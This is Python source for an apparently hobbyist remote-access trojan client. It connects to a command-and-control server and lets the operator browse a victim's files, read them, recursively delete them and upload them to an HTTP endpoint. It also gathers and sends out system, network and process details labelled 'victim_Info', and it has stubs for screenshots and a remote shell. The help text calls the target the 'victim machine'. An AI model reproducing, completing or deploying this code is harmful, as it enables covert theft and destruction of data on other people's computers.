import os,time
import tkinter.filedialog as fd
import requests
import os.path as path
from pprint import pprint
import colorama 
import subprocess,socket,sys
import psutil,threading
import platform
from tabulate import tabulate
from colorama import Fore,Style
colorama.init()
import socket


HEADER       =  2048 
PORT         =  5050
FORMAT       =  'utf-8'
SERVER       =  ""
ADDR         =  tuple((SERVER,PORT))
client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

client.connect(ADDR)




def send_msg(msg):
    message  = msg.encode(FORMAT)
    msg_len  = len(message)
    send_len = str(msg_len).encode(FORMAT)
    send_len+= b' ' * (HEADER - len(send_len))
    client.send(send_len)
    client.send(message)


def recv():
    msg_len = client.recv(HEADER).decode(FORMAT)
    if msg_len:
            msg_len = int(msg_len)
            msg     = client.recv(msg_len).decode(FORMAT)
            return msg

def server_input(cmd:str):
    send_msg(f"{cmd.strip()}--waiting_for_response")
    msg = None
    while msg == None:
        msg = recv()
    return msg




def gather_info():
    info = ''
    
    # System Information
    info += f'System: {platform.system()} {platform.release()} {platform.machine()}\n'
    
    # Hostname
    hostname = socket.gethostname()
    info += f'Hostname: {hostname}\n'
    
    # CPU Information
    cpu_info = platform.processor()
    info += f'CPU Info: {cpu_info}\n'
    
    # Memory Information
    mem_info = psutil.virtual_memory()
    info += f'Memory Info:\nTotal: {mem_info.total / (1024.0 ** 3):.2f} GB\nAvailable: {mem_info.available / (1024.0 ** 3):.2f} GB\n'
    
    # Disk Usage
    disk_usage = psutil.disk_usage('/')
    info += f'Disk Usage:\nTotal: {disk_usage.total / (1024.0 ** 3):.2f} GB\nUsed: {disk_usage.used / (1024.0 ** 3):.2f} GB\nFree: {disk_usage.free / (1024.0 ** 3):.2f} GB\n'
    
    # Network Interfaces
    net_info = psutil.net_if_addrs()
    info += 'Network Interfaces:\n'
    for interface, addresses in net_info.items():
        info += f'  {interface}\n'
        for address in addresses:
            if address.family == socket.AF_INET:
                info += f'    IPv4 Address: {address.address}\n'
            elif address.family == socket.AF_INET6:
                info += f'    IPv6 Address: {address.address}\n'
    
    # System Load
    load_avg = psutil.getloadavg()
    info += f'System Load: {load_avg[0]:.2f}, {load_avg[1]:.2f}, {load_avg[2]:.2f}\n'
    
    # Processes
    processes = psutil.process_iter(['pid', 'name', 'username', 'cpu_percent', 'memory_percent'])
    info += 'Processes:\n'
    for process in processes:
        try:
            process_info = process.info
            info += f'  PID: {process_info["pid"]} Name: {process_info["name"]} User: {process_info["username"]} CPU%: {process_info["cpu_percent"]:.2f} Memory%: {process_info["memory_percent"]:.2f}\n'
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    
    return info



ENDPOINT = 'http://127.0.0.1:8000'
def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8')as e:
            e.write(str(error)+"\n")



class Main:
    def __init__(self):
        self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]


    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    """
    ISNT DONE YET
    def takescreenshot(self):
        screenshot = screenshot = ImageGrab.grab()
        screenshot_bytes = screenshot.tobytes()
        img = PIL.Image.open(io.BytesIO(screenshot_bytes))
        img.show()
        sendable_screenshot = io.BytesIO(screenshot_bytes)
        current_time = datetime.datetime.now()
        file_name = current_time.strftime("%Y-%m-%d_%H-%M-%S.png")
        files = {"file": (file_name,sendable_screenshot)}
        try:
            r = requests.post(f"{ENDPOINT}/api/upload/image", files=files)
            if r.status_code == 200:
                send_msg(f"war--Took Screenshot status:{r.status_code}")
        except Exception as e:
            print(e)
            writetofile(e)
    """
    
    def removemanager(self,filepath):
        if os.path.isfile(filepath):
            self.removefile(filepath)
        else:
            for file in os.listdir(filepath):
                floader = path.join(filepath,file)
                self.removemanager(floader)

    def uploadfile(self,filepath):
        try:
            if os.path.isfile(filepath):
                try:
                    with open(filepath,"rb") as b:
                        r = requests.post(f"{ENDPOINT}/api/recive/payload",files={"File_param":b})
                        if r.status_code == 200:
                            print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
                except Exception as e:
                    writetofile(e)
        except Exception as e:
                    writetofile(e)

    def manageupload(self,filepath):
        try:    
            if path.isdir(filepath):
                for file in os.listdir(filepath):
                    floader = path.join(filepath,file)
                    self.manageupload(floader)
                    send_msg(f"conf-- Files are flowing [{file}]")
            else:
                self.uploadfile(filepath)

        except Exception as e:
            writetofile(e)

    def readfile(self,filepath):
        try:
            if platform.system() == "Linux":
                cmd = ['cat',filepath]
            elif platform.system() == "Windows":
                cmd = ['type',filepath]

            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            out, err = proc.communicate()
            if err:
                text =("Error occurred while executing the command")
            else:
                text = out.decode()
            data = {
                "data":text,
                "file_name":filepath
                }
            
            r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
        except Exception as e:
            writetofile(e)

    def infograbber(self):
        Userdata = gather_info()
        try:
                data = {
                    "data":str(Userdata),
                    "file_name":"victim_Info"
                    }
                
                r = requests.post(f"{ENDPOINT}/api/recive/text",json=data)
        except Exception as e:
            writetofile(e)

    def dostufftofile(self,base,filepath,cmd):
        if cmd == "remove":
            self.removemanager(filepath=filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "help":
            help = []
            help.append([Fore.RED +"--help"+ Style.RESET_ALL, Fore.RED + "shows this message" + Style.RESET_ALL])
            help.append([Fore.RED +"[dir] --walk"+ Style.RESET_ALL, Fore.RED + "walks to the choosen dir" + Style.RESET_ALL])
            help.append([Fore.RED +"--back"+ Style.RESET_ALL, Fore.RED + "walks to the parent dir" + Style.RESET_ALL])
            help.append([Fore.RED +"[file] --read"+ Style.RESET_ALL, Fore.RED + "reads the contents of the file" + Style.RESET_ALL])
            help.append([Fore.RED +"--upload"+ Style.RESET_ALL, Fore.RED + "uploads the file from the victim machine to the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"--power"+ Style.RESET_ALL, Fore.RED + "makes a shell to execute commands remotely from the CNC" + Style.RESET_ALL])
            help.append([Fore.RED +"[file or dir] --remove"+ Style.RESET_ALL, Fore.RED + "--remove: deletes the choosen file or dir" + Style.RESET_ALL])
            

            send_msg(str(f"help_list--{help}"))
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "upload" and ENDPOINT != None:
            self.manageupload(filepath)
            self.searchfiles(os.path.dirname(filepath))


        elif cmd == "read":
            self.readfile(filepath)
            self.searchfiles(os.path.dirname(filepath))

        elif cmd == "walk":
            if path.isdir(filepath):
                self.searchfiles(filepath)
            else:
                send_msg("war--you cant walk a file it must be a dir")
                time.sleep(2)
                self.searchfiles(os.path.dirname(filepath))

        elif cmd == "back":
            try:
                self.searchfiles(os.path.dirname(base))
            except Exception as e:
                print(e)
        elif cmd == "info":
            self.infograbber()
            
            
        elif cmd == "power":
            r =  requests.get(ENDPOINT+f"/api/commands/recive/{socket.gethostname()}")
            cmd = r.json()
            print(cmd)



        

            


    

    def searchfiles(self,folder_path):
        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + file_or_folder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            send_msg(str(f"file_list--{data}"))
            print("sent message")
            inp = server_input(cmd="file_manager")
            try:
                cmd = str(inp.split("--")[1]).strip(" ")
            except:
                send_msg("error--You have to add a Command")
            filename = inp.split("--")[0].strip(" ")
            floder =path.join(folder_path ,filename)
            print(f"CMD:{cmd} || filepath:{floder} || ENDPOINT:{ENDPOINT}")
            self.dostufftofile(base=folder_path,cmd=cmd,filepath=floder)
            
        

        except Exception as e:
            writetofile(e)                
                    

#print(fd.askdirectory())



APP = Main()






            

   


while True:
    msg = server_input(cmd="resp").strip()
    if msg != None:
        try:
            print(msg)
            if msg == "explore":
                    print("command recived")
                    if platform.system == "Linux":
                        try:
                            APP.searchfiles('/')
                        except Exception as e:
                            writetofile(e)
                    else:
                        APP.searchfiles(os.path.expanduser("~"))

            elif msg == "gather_info":
                try:
                    APP.infograbber()
                except Exception as e:
                    writetofile(e)
            
            elif msg == "screenshot":
                APP.takescreenshot()

            
        
                pass 
            else:
                pass 
        except Exception as e:
            writetofile(e)
            
